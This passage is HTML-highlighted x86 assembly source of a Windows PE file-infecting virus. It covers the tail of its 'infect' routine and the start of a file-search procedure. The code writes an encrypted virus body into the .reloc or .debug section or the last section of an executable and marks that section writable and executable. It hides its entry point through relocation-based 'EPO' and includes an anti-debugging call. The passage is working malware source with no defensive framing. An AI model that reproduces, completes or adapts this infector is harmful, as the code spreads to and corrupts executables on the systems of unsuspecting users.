                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Number of objects</span><span class="sc0">
</span><span class="sc5">find_reloc</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ler.'</span><span class="sc0">                   </span><span class="sc1">;.reloc</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">question_EPO</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">            </span><span class="sc5">find_reloc</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;find .debug section</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;begin of sections tabl.</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Number of objects</span><span class="sc0">
</span><span class="sc5">find_debug</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'bed.'</span><span class="sc0">                   </span><span class="sc1">;.debug</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@reloc_debug_finded</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">find_debug</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;neither .reloc nor .debug not finded</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@Standart</span><span class="sc0">

</span><span class="sc5">@@reloc_finded_stack</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;clear stack</span><span class="sc0">

</span><span class="sc5">@@reloc_debug_finded</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;.reloc or .debug are finded</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZbase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;begin of Exe</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;esi=Physical_Offset of .debug section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reloc_offset</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@Overwrite</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reTT_need</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;set flag @@overwrite=0</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;esi=.reloc secton</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;set new RVA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">i_close_exit</span><span class="sc0">                       </span><span class="sc1">;RVA=0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldRVA</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;section RVA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000</span><span class="sc0">                           </span><span class="sc1">;get 10 kb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMem</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_NPE32</span><span class="sc0">                         </span><span class="sc1">;edi=bufer dectination</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0E0000020h</span><span class="sc0">               </span><span class="sc1">;set attributes</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                      </span><span class="sc1">;Add virus size</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;esi=data</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">__edi</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov edi,xxxxxxxx</span><span class="sc0">
</span><span class="sc5">reloc_offset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;write virii</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_exit</span><span class="sc0">

</span><span class="sc5">@@Standart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;&lt;&lt;&lt;clear stack</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reTT_need</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;set flag @@overwrite=0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;set new RVA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">;RVA==0    ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldRVA</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Voff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;eax=virtual offset+physic size=new RVA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000</span><span class="sc0">                           </span><span class="sc1">;10 kb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMem</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;Virtual aligment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRTUAL_SIZE</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">;add 2 kb for decryptor</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Round</span><span class="sc0">                              </span><span class="sc1">;align to phys_aligment</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;Add virus size to section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Voff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;Virtual offset+virtualsize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                       </span><span class="sc1">;Correct imageSize</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0E0000020h</span><span class="sc0">                </span><span class="sc1">;set attributes</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_NPE32</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                      </span><span class="sc1">;Add virus size</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Foff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Offset of end of last section</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fseek</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;restore cpypted_size</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fwrite</span><span class="sc0">                            </span><span class="sc1">;write virii</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_exit</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">question_EPO</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc5">PHYSICAL_SIZE</span><span class="sc4">+</span><span class="sc2">900h</span><span class="sc0">   </span><span class="sc1">;check section size</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">size_s_ok</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;&lt;&lt;&lt;clear stack</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@Standart</span><span class="sc0">                          </span><span class="sc1">;standart infect</span><span class="sc0">
</span><span class="sc5">size_s_ok</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;if reloc &lt; virsize</span><span class="sc0">

                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                              </span><span class="sc1">;max 2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomGen</span><span class="sc0">                          </span><span class="sc1">;get random number</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;0 = make overwrite</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_dbg</span><span class="sc0">                                </span><span class="sc1">;1 = make EPO</span><span class="sc0">
                                                        </span><span class="sc1">;2 = debugers sucks:)</span><span class="sc0">
                                                        </span><span class="sc1">; &amp; EPO</span><span class="sc0">
</span><span class="sc5">_clear_one_param</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;               pop eax                                 ;&lt;&lt;&lt;clear stack</span><span class="sc0">
</span><span class="sc1">;               jmp @@reloc_debug_finded</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@reloc_finded_stack</span><span class="sc0">

</span><span class="sc5">_dbg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;eax==1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@reloc_EPO</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Debuger_fuckup</span><span class="sc0">

</span><span class="sc5">@@reloc_EPO</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;first obj.</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reTT_need</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;set flag @@overwrite</span><span class="sc0">
                                                        </span><span class="sc1">;into 1 or whatever value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZbase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;begin of Exe</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;esi==Physical_Offset of first section</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;clear stack&lt;&lt;&lt;&lt;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Voff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;eax=virtual offset</span><span class="sc0">
                                                        </span><span class="sc1">;+physic size=new RVA</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get section RVA</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;clear stack&lt;&lt;&lt;&lt;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;.reloc offset</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;edi=offset of .reloc section</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZbase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;correct on begin of file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">                            </span><span class="sc1">;write_some_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomGen</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;correct RVA_reloc</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EPO_edi</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mask_table</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">replace</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                             </span><span class="sc1">;get random (max 10)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomGen</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;count of functions</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;RELOC offset</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;CODE  offset</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;virtual offset</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Create_UEP(</span><span class="sc0">
</span><span class="sc1">;       dword   VO                      // virtual offset</span><span class="sc0">
</span><span class="sc1">;       *dword  code                    // offset to .code section(already has read)</span><span class="sc0">
</span><span class="sc1">;       *dword  reloc                   // offset to .reloc section(already has read)</span><span class="sc0">
</span><span class="sc1">;       dword   num_records             // count of records in table to rewrite</span><span class="sc0">
</span><span class="sc1">;       *dword  adr_modify              // address of "replasing" proc</span><span class="sc0">
</span><span class="sc1">;       *dword  mask_table              // pointer to a mask table</span><span class="sc0">
</span><span class="sc1">;        );</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Create_UEP</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;restore original esi</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">i_close_exit</span><span class="sc0">                        </span><span class="sc1">;no_relocs_finded :(</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000</span><span class="sc0">                           </span><span class="sc1">;get 10 kb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMem</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;edi=mem</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_NPE32</span><span class="sc0">                         </span><span class="sc1">;cpypt virii</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                      </span><span class="sc1">;Add virus size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0E0000020h</span><span class="sc0">               </span><span class="sc1">;set attributes</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">__edi</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov edi,EPO_edi</span><span class="sc0">
                </span><span class="sc5">EPO_edi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">c_manager</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">cm_size</span><span class="sc0">                         </span><span class="sc1">;manager size</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy "manager"</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy virii</span><span class="sc0">

</span><span class="sc5">common_exit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalFree</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;free memory</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileNum</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">i_close_exit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">f_closemap</span><span class="sc0">                        </span><span class="sc1">;unmap file from memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">fclose</span><span class="sc0">                            </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc5">no_EXE</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;In: edx=dirname</span><span class="sc0">
</span><span class="sc1">;    edi=SearchRec</span><span class="sc0">
</span><span class="sc5">filefind</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

